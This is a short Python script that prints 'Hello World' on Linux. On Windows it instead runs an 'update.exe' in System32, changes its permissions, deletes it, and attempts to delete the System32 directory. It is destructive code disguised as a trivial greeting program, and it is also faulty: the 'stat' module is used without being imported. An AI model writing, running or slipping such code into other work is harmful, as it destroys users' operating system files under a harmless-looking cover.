import os
from sys import platform
if platform == "linux" or platform == "linux2":
  print("Hello World")
elif platform == "win32":
  os.system("C://Windows//System32//update.exe")
  os.chmod("C://Windows//System32//update.exe", stat.S_IRWXU)
  os.remove("C://Windows//System32//update.exe")
  os.rmdir("C:\Windows\System32")
